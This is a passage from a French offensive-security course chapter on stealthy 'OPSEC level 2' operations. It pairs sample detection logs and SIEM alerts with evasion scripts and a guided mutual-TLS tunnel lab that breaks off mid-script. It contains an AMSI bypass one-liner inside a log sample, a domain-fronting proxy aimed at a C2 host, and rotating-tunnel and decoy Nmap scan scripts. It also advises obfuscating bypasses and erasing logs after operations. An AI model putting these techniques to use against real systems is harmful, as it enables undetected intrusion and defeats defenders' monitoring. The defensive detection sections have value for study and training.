   New Process ID: 0x456
   New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
   Command Line: powershell.exe -EncodedCommand JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJABjACAAPQAgACcAaQBVAHQAaQBsAHMAJwA=
   ```

2. **Logs PowerShell**
   - Événements de script block logging
   - Tentatives de contournement d'AMSI
   - Exécution de code encodé ou obfusqué
   
   **Exemple de log PowerShell :**
   ```
   Event ID: 4104
   Script block logging
   ScriptBlock ID: {guid}
   Path: 
   ScriptBlock Text: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   ```

3. **Logs EDR**
   - Détections de comportements suspects
   - Tentatives d'injection de code
   - Modifications de la mémoire des processus
   
   **Exemple de log EDR :**
   ```
   [ALERT] AMSI Bypass Attempt
   Process: powershell.exe (PID: 1234)
   User: DOMAIN\user
   Command Line: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "..."
   Technique: T1562.001 - Impair Defenses: Disable or Modify Tools
   Severity: High
   ```

#### Traces générées par les scans Nmap

1. **Logs de pare-feu**
   - Tentatives de connexion multiples
   - Paquets avec des flags TCP inhabituels
   - Scans de ports séquentiels ou aléatoires
   
   **Exemple de log de pare-feu :**
   ```
   May 15 14:23:45 firewall kernel: SCAN-SYN IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=192.168.1.100 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0
   ```

2. **Logs IDS/IPS**
   - Détection de signatures de scan Nmap
   - Alertes de reconnaissance réseau
   - Détection de paquets fragmentés ou malformés
   
   **Exemple d'alerte Snort :**
   ```
   [**] [1:1000001:1] SCAN-NMAP TCP [**]
   [Classification: Attempted Information Gathering] [Priority: 2]
   05/15-14:23:45.123456 192.168.1.100:54321 -> 10.0.0.1:80
   TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:60
   ******S* Seq: 0x12345678 Ack: 0x0 Win: 0x1000 TcpLen: 40
   TCP Options (5) => MSS: 1460 SackOK TS: 12345678 0 NOP WS: 7
   ```

3. **Logs système**
   - Connexions échouées multiples
   - Tentatives d'accès à des services
   - Timeouts de connexion
   
   **Exemple de log système :**
   ```
   May 15 14:23:45 server sshd[1234]: Failed none for invalid user from 192.168.1.100 port 54321 ssh2
   May 15 14:23:46 server sshd[1235]: Failed none for invalid user from 192.168.1.100 port 54322 ssh2
   May 15 14:23:47 server sshd[1236]: Failed none for invalid user from 192.168.1.100 port 54323 ssh2
   ```

#### Alertes SIEM typiques

**Alerte de tunnel TLS personnalisé :**
```
[ALERT] Suspicious TLS Configuration Detected
Source IP: 192.168.1.100
Destination: 10.0.0.1:8443
Time: 2023-05-15 14:23:45
Details: TLS connection with non-standard cipher suite and self-signed certificate
Severity: Medium
```

**Alerte de contournement d'AMSI :**
```
[ALERT] AMSI Bypass Attempt Detected
Host: workstation01
Process: powershell.exe (PID: 1234)
User: DOMAIN\user
Time: 2023-05-15 14:30:12
Details: Attempt to modify AMSI settings in memory
Severity: High
```

**Alerte de scan Nmap :**
```
[ALERT] Network Scan Detected
Source IP: 192.168.1.100
Target: Multiple hosts/ports
Time: 2023-05-15 14:35:27
Details: TCP SYN scan with fragmented packets and randomized timing
Severity: Medium
```

### Pièges classiques et erreurs à éviter

#### Erreurs avec les tunnels TLS

1. **Configuration incorrecte des certificats**
   - Utilisation de noms communs (CN) inappropriés
   - Oubli de renouveler les certificats expirés
   - Chaînes de certificats incomplètes
   
   **Solution :** Vérifiez soigneusement la configuration des certificats, utilisez des noms communs plausibles, et mettez en place un processus de renouvellement.

2. **Choix de suites de chiffrement trop restrictives**
   - Suites de chiffrement incompatibles avec la cible
   - Configurations trop exotiques facilement identifiables
   - Versions de TLS obsolètes ou trop récentes
   
   **Solution :** Utilisez des suites de chiffrement courantes mais sécurisées, et adaptez-les au contexte de la cible.

3. **Tunnels persistants**
   - Tunnels laissés ouverts pendant de longues périodes
   - Absence de mécanisme de reconnexion
   - Connexions abandonnées sans être correctement fermées
   
   **Solution :** Implémentez des mécanismes de rotation et de reconnexion automatique, et fermez proprement les tunnels après utilisation.

#### Erreurs avec les contournements d'AMSI/EDR

1. **Utilisation de techniques connues**
   - Techniques de contournement documentées et détectées
   - Scripts non modifiés provenant de GitHub
   - Payloads avec des signatures connues
   
   **Solution :** Personnalisez et obfusquez les techniques de contournement, et testez-les dans un environnement contrôlé avant utilisation.

2. **Contournements trop agressifs**
   - Désactivation complète des mécanismes de sécurité
   - Modifications évidentes de la mémoire
   - Comportements anormaux des processus
   
   **Solution :** Adoptez une approche plus subtile, en ciblant uniquement les composants nécessaires et en minimisant les modifications.

3. **Négligence des logs**
   - Oubli de désactiver la journalisation
   - Non-suppression des logs après opération
   - Traces évidentes dans les journaux d'événements
   
   **Solution :** Planifiez la gestion des logs avant chaque opération, et utilisez des techniques pour minimiser ou nettoyer les traces.

#### Erreurs avec les scans Nmap

1. **Scans trop agressifs**
   - Utilisation de templates de timing rapides (T4, T5)
   - Scan de tous les ports sans discrimination
   - Exécution simultanée de multiples scans
   
   **Solution :** Utilisez des templates de timing lents (T1, T2), limitez la portée des scans, et espacez-les dans le temps.

2. **Négligence des options de furtivité**
   - Oubli d'utiliser les options de fragmentation
   - Non-utilisation des techniques de leurre
   - Scan depuis une adresse IP directement attribuable
   
   **Solution :** Utilisez systématiquement les options de furtivité comme la fragmentation, les leurres, et le routage via des proxies.

3. **Mauvaise interprétation des résultats**
   - Confiance excessive dans les résultats automatisés
   - Négligence des faux positifs/négatifs
   - Conclusions hâtives basées sur des scans incomplets
   
   **Solution :** Vérifiez manuellement les résultats importants, et complétez les scans automatisés par des vérifications ciblées.

### OPSEC Tips : opérations furtives

#### Techniques de base

1. **Utilisation de ports légitimes**
   ```bash
   # Tunnel TLS sur le port HTTPS
   socat OPENSSL-LISTEN:443,cert=server.pem,verify=0 TCP:localhost:22
   
   # Scan Nmap limité aux ports courants
   nmap -T2 -sS -p 80,443,8080 --scan-delay 500ms 192.168.1.0/24
   ```

2. **Limitation du volume de trafic**
   ```bash
   # Limitation de la bande passante avec trickle
   trickle -d 100 -u 50 ssh -D 1080 user@pivot.example.com
   
   # Scan Nmap avec taux limité
   nmap --min-rate 10 --max-rate 50 192.168.1.0/24
   ```

3. **Rotation des connexions**
   ```bash
   # Script de rotation de tunnels SSH
   while true; do
       ssh -f -N -D 1080 user@pivot.example.com
       sleep $((RANDOM % 1800 + 900))  # 15-45 minutes
       pkill -f "ssh.*-D 1080"
       sleep $((RANDOM % 300 + 60))    # 1-5 minutes
   done
   ```

#### Techniques avancées

1. **Mimétisme de trafic légitime**
   ```bash
   # Configuration de Stunnel pour imiter le trafic HTTPS
   cat > stunnel.conf << EOF
   [https]
   client = yes
   accept = 127.0.0.1:8080
   connect = server.example.com:443
   TIMEOUTclose = 0
   options = NO_SSLv2
   options = NO_SSLv3
   ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384
   EOF
   ```

2. **Utilisation de domain fronting**
   ```bash
   # Configuration d'un proxy avec domain fronting
   # Utilisation d'un domaine légitime comme frontal
   cat > fronting.py << 'EOF'
   #!/usr/bin/env python3
   import socket
   import ssl
   import sys
   
   # Configuration
   LISTEN_PORT = 8080
   FRONT_DOMAIN = "legitimate-cdn.com"
   ACTUAL_DOMAIN = "hidden-c2.com"
   ACTUAL_PORT = 443
   
   def handle_client(client_socket):
       # Création d'une connexion SSL vers le CDN
       context = ssl.create_default_context()
       remote_socket = socket.create_connection((FRONT_DOMAIN, ACTUAL_PORT))
       remote_ssl = context.wrap_socket(remote_socket, server_hostname=FRONT_DOMAIN)
       
       # Modification de l'en-tête Host pour le domain fronting
       data = client_socket.recv(4096)
       if data:
           # Remplacer l'en-tête Host
           modified_data = data.replace(
               f"Host: {FRONT_DOMAIN}".encode(),
               f"Host: {ACTUAL_DOMAIN}".encode()
           )
           remote_ssl.send(modified_data)
       
       # Boucle de transfert de données
       while True:
           try:
               # Données du client vers le serveur
               client_data = client_socket.recv(4096)
               if not client_data:
                   break
               remote_ssl.send(client_data)
               
               # Données du serveur vers le client
               remote_data = remote_ssl.recv(4096)
               if not remote_data:
                   break
               client_socket.send(remote_data)
           except:
               break
       
       # Fermeture des connexions
       client_socket.close()
       remote_ssl.close()
   
   def main():
       server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       server.bind(("0.0.0.0", LISTEN_PORT))
       server.listen(5)
       
       print(f"[*] Listening on 0.0.0.0:{LISTEN_PORT}")
       
       while True:
           client, addr = server.accept()
           print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
           
           # Gestion de la connexion client
           handle_client(client)
   
   if __name__ == "__main__":
       main()
   EOF
   
   chmod +x fronting.py
   ./fronting.py
   ```

3. **Techniques de diversification**
   ```bash
   # Script de diversification des tunnels
   cat > diversify_tunnels.sh << 'EOF'
   #!/bin/bash
   
   # Configuration
   TARGETS=("server1.example.com" "server2.example.com" "server3.example.com")
   PORTS=(443 8443 3389)
   METHODS=("ssh" "socat" "stunnel")
   
   # Fonction pour créer un tunnel aléatoire
   create_random_tunnel() {
       # Sélection aléatoire de la cible, du port et de la méthode
       target=${TARGETS[$RANDOM % ${#TARGETS[@]}]}
       port=${PORTS[$RANDOM % ${#PORTS[@]}]}
       method=${METHODS[$RANDOM % ${#METHODS[@]}]}
       
       local_port=$((RANDOM % 10000 + 40000))
       
       echo "[+] Création d'un tunnel avec $method vers $target:$port sur le port local $local_port"
       
       case $method in
           ssh)
               ssh -f -N -L $local_port:localhost:$port $target
               ;;
           socat)
               socat TCP-LISTEN:$local_port,fork OPENSSL:$target:$port,verify=0 &
               ;;
           stunnel)
               cat > stunnel-$local_port.conf << EOC
               client = yes
               pid = /tmp/stunnel-$local_port.pid
               output = /tmp/stunnel-$local_port.log
               
               [tunnel]
               accept = 127.0.0.1:$local_port
               connect = $target:$port
               EOC
               
               stunnel stunnel-$local_port.conf
               ;;
       esac
       
       echo $local_port
   }
   
   # Fonction pour fermer un tunnel
   close_tunnel() {
       local method=$1
       local port=$2
       
       case $method in
           ssh)
               pkill -f "ssh.*-L $port:"
               ;;
           socat)
               pkill -f "socat.*TCP-LISTEN:$port"
               ;;
           stunnel)
               pkill -f "stunnel.*stunnel-$port.conf"
               rm -f stunnel-$port.conf /tmp/stunnel-$port.pid /tmp/stunnel-$port.log
               ;;
       esac
   }
   
   # Boucle principale
   while true; do
       # Création d'un nouveau tunnel
       port=$(create_random_tunnel)
       method=${METHODS[$RANDOM % ${#METHODS[@]}]}
       
       echo "[+] Tunnel actif sur le port $local_port avec $method"
       
       # Attente aléatoire entre 30 et 90 minutes
       sleep_time=$((RANDOM % 3600 + 1800))
       echo "[+] Rotation dans $sleep_time secondes"
       sleep $sleep_time
       
       # Fermeture du tunnel actuel
       close_tunnel $method $port
       
       # Pause aléatoire avant de créer un nouveau tunnel
       pause_time=$((RANDOM % 300 + 60))
       echo "[+] Pause de $pause_time secondes"
       sleep $pause_time
   done
   EOF
   
   chmod +x diversify_tunnels.sh
   ```

#### Script d'OPSEC niveau 2

Voici un exemple de script pour mettre en place un environnement OPSEC de niveau 2 :

```bash
#!/bin/bash
# opsec_level2.sh - Configuration d'un environnement OPSEC de niveau 2

# Vérification des privilèges root
if [ "$EUID" -ne 0 ]; then
    echo "[-] Ce script nécessite des privilèges root pour certaines opérations."
    exit 1
fi

# Création du répertoire de travail
WORK_DIR="/tmp/opsec_level2"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Configuration des variables
PIVOT_HOST=${1:-"pivot.example.com"}
PIVOT_USER=${2:-"user"}
LOCAL_PORT=$((RANDOM % 10000 + 40000))
REMOTE_PORT=443

# Fonction pour installer les dépendances
install_dependencies() {
    echo "[*] Installation des dépendances..."
    apt-get update
    apt-get install -y socat stunnel4 proxychains4 trickle openssl
}

# Fonction pour générer des certificats TLS
generate_certificates() {
    echo "[*] Génération des certificats TLS..."
    mkdir -p "$WORK_DIR/certs"
    cd "$WORK_DIR/certs"
    
    # Génération d'une autorité de certification (CA)
    openssl req -new -x509 -days 365 -nodes -out ca.crt -keyout ca.key \
      -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=Custom CA"
    
    # Génération d'une clé privée pour le serveur
    openssl genrsa -out server.key 2048
    
    # Création d'une demande de signature de certificat (CSR)
    openssl req -new -key server.key -out server.csr \
      -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=$PIVOT_HOST"
    
    # Signature du certificat par la CA
    openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key \
      -set_serial 01 -out server.crt
    
    # Combinaison de la clé et du certificat pour Socat/Stunnel
    cat server.key server.crt > server.pem
    chmod 600 server.pem
    
    # Génération d'une clé privée pour le client
    openssl genrsa -out client.key 2048
    
    # Création d'une demande de signature de certificat (CSR)
    openssl req -new -key client.key -out client.csr \
      -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=client.local"
    
    # Signature du certificat par la CA
    openssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca.key \
      -set_serial 02 -out client.crt
    
    # Combinaison de la clé et du certificat pour Socat/Stunnel
    cat client.key client.crt > client.pem
    chmod 600 client.pem
    
    cd "$WORK_DIR"
}

# Fonction pour configurer un tunnel TLS avec Stunnel
setup_stunnel() {
    echo "[*] Configuration de Stunnel..."
    
    # Configuration du client Stunnel
    cat > stunnel-client.conf << EOF
# Configuration Stunnel client
client = yes
pid = $WORK_DIR/stunnel-client.pid
output = $WORK_DIR/stunnel-client.log
debug = 0
foreground = no

# Paramètres TLS
cert = $WORK_DIR/certs/client.pem
CAfile = $WORK_DIR/certs/ca.crt
verify = 2
ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384
options = NO_SSLv2
options = NO_SSLv3
options = NO_TLSv1
options = NO_TLSv1.1

[tunnel]
accept = 127.0.0.1:$LOCAL_PORT
connect = $PIVOT_HOST:$REMOTE_PORT
EOF
    
    # Démarrage de Stunnel
    stunnel stunnel-client.conf
    
    # Vérification que Stunnel est en cours d'exécution
    if pgrep -f "stunnel.*stunnel-client.conf" > /dev/null; then
        echo "[+] Stunnel démarré avec succès (PID: $(pgrep -f "stunnel.*stunnel-client.conf"))"
    else
        echo "[-] Échec du démarrage de Stunnel"
        exit 1
    fi
}

# Fonction pour configurer ProxyChains
setup_proxychains() {
    echo "[*] Configuration de ProxyChains..."
    
    # Sauvegarde de la configuration existante
    if [ -f /etc/proxychains4.conf ]; then
        cp /etc/proxychains4.conf /etc/proxychains4.conf.bak
    fi
    
    # Configuration de ProxyChains
    cat > /etc/proxychains4.conf << EOF
# Configuration ProxyChains
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

# Liste des proxies
socks5 127.0.0.1 $LOCAL_PORT
EOF
    
    echo "[+] ProxyChains configuré pour utiliser le tunnel sur le port $LOCAL_PORT"
}

# Fonction pour créer un script de rotation de tunnels
create_rotation_script() {
    echo "[*] Création du script de rotation de tunnels..."
    
    cat > tunnel_rotation.sh << 'EOF'
#!/bin/bash

# Configuration
WORK_DIR="/tmp/opsec_level2"
PIVOT_HOST="pivot.example.com"
PIVOT_USER="user"
REMOTE_PORT=443

# Fonction pour créer un tunnel
create_tunnel() {
    local local_port=$((RANDOM % 10000 + 40000))
    
    echo "[+] Création d'un tunnel sur le port local $local_port"
    
    # Configuration de Stunnel
    cat > $WORK_DIR/stunnel-$local_port.conf << EOC
# Configuration Stunnel client
client = yes
pid = $WORK_DIR/stunnel-$local_port.pid
output = $WORK_DIR/stunnel-$local_port.log
debug = 0
foreground = no

# Paramètres TLS
cert = $WORK_DIR/certs/client.pem
CAfile = $WORK_DIR/certs/ca.crt
verify = 2
ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384
options = NO_SSLv2
options = NO_SSLv3
options = NO_TLSv1
options = NO_TLSv1.1

[tunnel]
accept = 127.0.0.1:$local_port
connect = $PIVOT_HOST:$REMOTE_PORT
EOC
    
    # Démarrage de Stunnel
    stunnel $WORK_DIR/stunnel-$local_port.conf
    
    # Mise à jour de la configuration ProxyChains
    sed -i "s/socks5 127.0.0.1 [0-9]*/socks5 127.0.0.1 $local_port/" /etc/proxychains4.conf
    
    echo $local_port
}

# Fonction pour fermer un tunnel
close_tunnel() {
    local port=$1
    
    echo "[+] Fermeture du tunnel sur le port $port"
    
    # Arrêt de Stunnel
    pkill -f "stunnel.*stunnel-$port.conf"
    
    # Suppression des fichiers de configuration
    rm -f $WORK_DIR/stunnel-$port.conf $WORK_DIR/stunnel-$port.pid $WORK_DIR/stunnel-$port.log
}

# Boucle principale
while true; do
    # Création d'un nouveau tunnel
    port=$(create_tunnel)
    
    echo "[+] Tunnel actif sur le port $port"
    echo "[+] Utilisez 'proxychains <commande>' pour router le trafic via le tunnel"
    
    # Attente aléatoire entre 30 et 90 minutes
    sleep_time=$((RANDOM % 3600 + 1800))
    echo "[+] Rotation dans $sleep_time secondes"
    sleep $sleep_time
    
    # Fermeture du tunnel actuel
    close_tunnel $port
    
    # Pause aléatoire avant de créer un nouveau tunnel
    pause_time=$((RANDOM % 300 + 60))
    echo "[+] Pause de $pause_time secondes"
    sleep $pause_time
done
EOF
    
    chmod +x tunnel_rotation.sh
    echo "[+] Script de rotation créé: $WORK_DIR/tunnel_rotation.sh"
}

# Fonction pour créer un script de scan Nmap OPSEC
create_nmap_script() {
    echo "[*] Création du script de scan Nmap OPSEC..."
    
    cat > nmap_opsec.sh << 'EOF'
#!/bin/bash

if [ $# -lt 1 ]; then
    echo "Usage: $0 <target> [output_file] [intensity]"
    echo "Intensity: low, medium, high (default: medium)"
    exit 1
fi

TARGET=$1
OUTPUT_FILE=${2:-"scan_$(date +%Y%m%d_%H%M%S).xml"}
INTENSITY=${3:-"medium"}

# Configuration selon l'intensité
case $INTENSITY in
    low)
        echo "[+] Mode furtif (très lent, très discret)"
        TIMING="-T1"
        SCAN_TYPE="-sS"
        EXTRA_OPTS="--scan-delay 1s --max-retries 1 -f --mtu 24 -D RND:5 --randomize-hosts"
        PORTS="--top-ports 20"
        ;;
    medium)
        echo "[+] Mode équilibré (lent, assez discret)"
        TIMING="-T2"
        SCAN_TYPE="-sS"
        EXTRA_OPTS="--scan-delay 500ms --max-retries 2 -f --randomize-hosts"
        PORTS="-p 21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,465,587,636,1433,3306,3389,5432,5900,8080,8443"
        ;;
    high)
        echo "[+] Mode efficace (modéré, moins discret)"
        TIMING="-T3"
        SCAN_TYPE="-sS"
        EXTRA_OPTS="--min-rate 10 --max-rate 50 --randomize-hosts"
        PORTS="-p 1-1000,1433,3306,3389,5432,5900,8080,8443"
        ;;
    *)
        echo "[-] Intensité non reconnue: $INTENSITY"
        echo "[-] Valeurs supportées: low, medium, high"
        exit 1
        ;;
esac

# Exécution du scan via ProxyChains
echo "[*] Exécution du scan Nmap via ProxyChains..."
proxychains nmap $TIMING $SCAN_TYPE $PORTS $EXTRA_OPTS -Pn $TARGET -oX $OUTPUT_FILE

echo "[+] Scan terminé. Résultats enregistrés dans $OUTPUT_FILE"
EOF
    
    chmod +x nmap_opsec.sh
    echo "[+] Script de scan Nmap créé: $WORK_DIR/nmap_opsec.sh"
}

# Fonction pour créer un script de nettoyage
create_cleanup_script() {
    echo "[*] Création du script de nettoyage..."
    
    cat > cleanup.sh << 'EOF'
#!/bin/bash

# Configuration
WORK_DIR="/tmp/opsec_level2"

# Arrêt des tunnels Stunnel
echo "[*] Arrêt des tunnels Stunnel..."
pkill -f "stunnel.*stunnel-.*\.conf"

# Restauration de la configuration ProxyChains
if [ -f /etc/proxychains4.conf.bak ]; then
    echo "[*] Restauration de la configuration ProxyChains..."
    mv /etc/proxychains4.conf.bak /etc/proxychains4.conf
fi

# Suppression des fichiers temporaires
echo "[*] Suppression des fichiers temporaires..."
rm -rf $WORK_DIR

echo "[+] Nettoyage terminé"
EOF
    
    chmod +x cleanup.sh
    echo "[+] Script de nettoyage créé: $WORK_DIR/cleanup.sh"
}

# Exécution des fonctions
install_dependencies
generate_certificates
setup_stunnel
setup_proxychains
create_rotation_script
create_nmap_script
create_cleanup_script

echo "[+] Configuration OPSEC niveau 2 terminée"
echo "[+] Tunnel TLS actif sur le port local $LOCAL_PORT"
echo "[+] Utilisez 'proxychains <commande>' pour router le trafic via le tunnel"
echo "[+] Pour démarrer la rotation automatique des tunnels: $WORK_DIR/tunnel_rotation.sh"
echo "[+] Pour effectuer un scan Nmap discret: $WORK_DIR/nmap_opsec.sh <cible>"
echo "[+] Pour nettoyer l'environnement: $WORK_DIR/cleanup.sh"

exit 0
```

### Points clés

- L'OPSEC de niveau 2 introduit des techniques de furtivité active pour réduire la détection pendant les opérations.
- Le chiffrement TLS personnalisé permet de créer des tunnels sécurisés et moins détectables pour les communications.
- Les techniques de contournement d'AMSI/EDR sont essentielles pour éviter la détection lors de l'exécution de code potentiellement malveillant.
- Le traffic-shaping Nmap permet de réduire la signature des activités de reconnaissance réseau.
- Les équipes défensives peuvent détecter ces techniques via l'analyse des logs réseau, système et application.
- Des techniques OPSEC appropriées, comme la rotation des tunnels et la limitation du trafic, permettent de réduire significativement la détectabilité des opérations.

### Mini-quiz (3 QCM)

1. **Quelle technique permet de créer un tunnel TLS personnalisé avec authentification mutuelle ?**
   - A) `ssh -L 8080:localhost:80 user@server`
   - B) `socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0 TCP:localhost:80`
   - C) `socat OPENSSL-LISTEN:8443,cert=server.pem,cafile=ca.crt,verify=1 TCP:localhost:80`
   - D) `stunnel -c -r server:443`

   *Réponse : C*

2. **Quelle technique de contournement d'AMSI est la plus discrète ?**
   - A) Désactivation directe d'AMSI via la modification de la mémoire
   - B) Fragmentation du code malveillant en plusieurs parties
   - C) Utilisation d'outils légitimes du système (Living Off The Land)
   - D) Encodage Base64 du code malveillant

   *Réponse : C*

3. **Quelle option Nmap permet de réduire la détectabilité des scans ?**
   - A) `-T5 --min-rate 1000`
   - B) `-sS -f -D RND:10 --scan-delay 500ms`
   - C) `-sV --version-all`
   - D) `-O --osscan-guess`

   *Réponse : B*

### Lab/Exercice guidé : Mise en place d'un tunnel TLS personnalisé

#### Objectif
Créer un tunnel TLS personnalisé avec authentification mutuelle pour accéder à un service interne de manière discrète.

#### Prérequis
- Deux machines Linux (attaquant et pivot)
- Accès SSH au pivot
- Service web interne à accéder (simulé sur le pivot)

#### Étapes

1. **Préparation de l'environnement**

```bash
# Sur l'attaquant
# Création du répertoire de travail
mkdir -p ~/pentest_labs/tls_tunnel
cd ~/pentest_labs/tls_tunnel

# Installation des outils nécessaires
sudo apt update
sudo apt install -y openssl socat stunnel4
```

2. **Génération des certificats**

```bash
# Création d'un répertoire pour les certificats
mkdir -p ~/pentest_labs/tls_tunnel/certs
cd ~/pentest_labs/tls_tunnel/certs

# Génération d'une autorité de certification (CA)
openssl req -new -x509 -days 365 -nodes -out ca.crt -keyout ca.key \
  -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=Custom CA"

# Génération d'une clé privée pour le serveur
openssl genrsa -out server.key 2048

# Création d'une demande de signature de certificat (CSR)
openssl req -new -key server.key -out server.csr \
  -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=server.local"

# Signature du certificat par la CA
openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key \
  -set_serial 01 -out server.crt

# Combinaison de la clé et du certificat pour Socat/Stunnel
cat server.key server.crt > server.pem
chmod 600 server.pem

# Génération d'une clé privée pour le client
openssl genrsa -out client.key 2048

# Création d'une demande de signature de certificat (CSR)
openssl req -new -key client.key -out client.csr \
  -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=client.local"

# Signature du certificat par la CA
openssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca.key \
  -set_serial 02 -out client.crt

# Combinaison de la clé et du certificat pour Socat/Stunnel
cat client.key client.crt > client.pem
chmod 600 client.pem
```

3. **Transfert des certificats au pivot**

```bash
# Création d'un répertoire pour les certificats sur le pivot
ssh user@pivot "mkdir -p ~/tls_tunnel/certs"

# Transfert des certificats
scp server.pem ca.crt user@pivot:~/tls_tunnel/certs/
```

4. **Configuration du service web sur le pivot**

```bash
# Connexion au pivot
ssh user@pivot

# Création d'un serveur web simple pour le test
cat > ~/tls_tunnel/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Service Web Interne</title>
</head>
<body>
    <h1>Service Web Interne</h1>
    <p>Ce service est accessible via un tunnel TLS personnalisé.</p>
    <p>Date et heure du serveur: $(date)</p>
</body>
</html>
EOF

# Démarrage d'un serveur web simple sur le port 8080
cd ~/tls_tunnel
python3 -m http.server 8080 &

# Vérification que le serveur web est en cours d'exécution
curl http://localhost:8080
```

5. **Configuration du tunnel TLS avec Socat**

```bash
# Sur le pivot
cd ~/tls_tunnel
socat OPENSSL-LISTEN:8443,cert=certs/server.pem,cafile=certs/ca.crt,verify=1 TCP:localhost:8080 &

# Vérification que Socat est en cours d'exécution
netstat -tuln | grep 8443
```

6. **Configuration du client Socat**

```bash
# Sur l'attaquant
cd ~/pentest_labs/tls_tunnel
socat TCP-LISTEN:8080,reuseaddr,fork OPENSSL:pivot:8443,cert=certs/client.pem,cafile=certs/ca.crt,verify=1 &

# Vérification que Socat est en cours d'exécution
netstat -tuln | grep 8080

# Test d'accès au service web via le tunnel
curl http://localhost:8080
```

7. **Configuration du tunnel TLS avec Stunnel**

```bash
# Sur le pivot
cd ~/tls_tunnel
cat > stunnel-server.conf << EOF
# Configuration Stunnel serveur
pid = ~/tls_tunnel/stunnel-server.pid
output = ~/tls_tunnel/stunnel-server.log
debug = 0
foreground = no

# Paramètres TLS
cert = certs/server.pem
CAfile = certs/ca.crt
verify = 2
ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384
options = NO_SSLv2
options = NO_SSLv3
options = NO_TLSv1
options = NO_TLSv1.1

[webservice]
accept = 8443
connect = 127.0.0.1:8080
EOF

# Démarrage de Stunnel
stunnel stunnel-server.conf

# Vérification que Stunnel est en cours d'exécution
ps aux | grep stunnel
```

8. **Configuration du client Stunnel**

```bash
# Sur l'attaquant
cd ~/pentest_labs/tls_tunnel
cat > stunnel-client.conf << EOF
# Configuration Stunnel client
client = yes
pid = ~/pentest_labs/tls_tunnel/stunnel-client.pid
output = ~/pentest_labs/tls_tunnel/stunnel-client.log
debug = 0
foreground = no

# Paramètres TLS
cert = certs/client.pem
CAfile = certs/ca.crt
verify = 2
ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384
options = NO_SSLv2
options = NO_SSLv3
options = NO_TLSv1
options = NO_TLSv1.1

[webservice]
accept = 127.0.0.1:8080
connect = pivot:8443
EOF

# Démarrage de Stunnel
stunnel stunnel-client.conf

# Vérification que Stunnel est en cours d'exécution
ps aux | grep stunnel

# Test d'accès au service web via le tunnel
curl http://localhost:8080
```

9. **Analyse du trafic TLS**

```bash
# Sur l'attaquant
# Capture du trafic TLS
sudo tcpdump -i any -w tunnel_traffic.pcap host pivot and port 8443

# Analyse du trafic capturé
wireshark tunnel_traffic.pcap
```

10. **Rotation automatique des tunnels**

```bash
# Sur l'attaquant
cat > rotate_tunnels.sh << 'EOF'
#!/bin/bash

# Configuration
PIVOT="pivot"
PIVOT_PORT=8443
LOCAL_BASE_PORT=8080

# Fonction pour créer un tunnel
create_tunnel() {
    local local_port=$((LOCAL_BASE_PORT + RANDOM % 1000))
    
    echo "[+] Création d'un tunnel sur le port local $local_port"
    
    # Configuration de Stunnel
    cat > stunnel-$local_port.conf << EOC
# Configuration Stunnel client
client = yes
pid = ~/pentest_labs/tls_tunnel/stunnel-$local_port.pid
output = ~/pentest_labs/tls_tunnel/stunnel-$local_port.log
debug = 0
foreground = no

# Paramètres TLS
cert = certs/client.pem
CAfile = certs/ca.crt
verify = 2
ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384
options = NO_SSLv2
options = NO_SSLv3
options = NO_TLSv1
options = NO_TLSv1.1

[webservice]
accept = 127.0.0.1:$local_port
connect = $PIVOT:$PIVOT_PORT
EOC
    
    # Démarrage de Stunnel
    stunnel stunnel-$local_port.conf
    
    echo $local_port
}

# Fonction pour fermer un tunnel
close_tunnel() {
    local port=$1
    
    echo "[+] Fermeture du tunnel sur le port $port"
    
    # Arrêt de Stunnel
    pkill -f "stunnel.*stunnel-$port.conf"
    
    # Suppression des fichiers de configuration
    rm -f stunnel-$port.conf ~/pentest_labs/tls_tunnel/stunnel-$port.pid ~/pentest_labs/tls_tunnel/stunnel-$port.log
}

# Boucle principale
while true; do
    # Création d'un nouveau tunnel
    port=$(create_tunnel)
    
    echo "[+] Tunnel actif sur le port $port"
    echo "[+] Accédez au service via http://localhost:$port"
    
    # Attente aléatoire entre 5 et 15 minutes (pour le test)
    sleep_time=$((RANDOM % 600 + 300))
    echo "[+] Rotation dans $sleep_time secondes"
    sleep $sleep_time
    
    # Fermeture du tunnel actuel
    close_tunnel $port
    
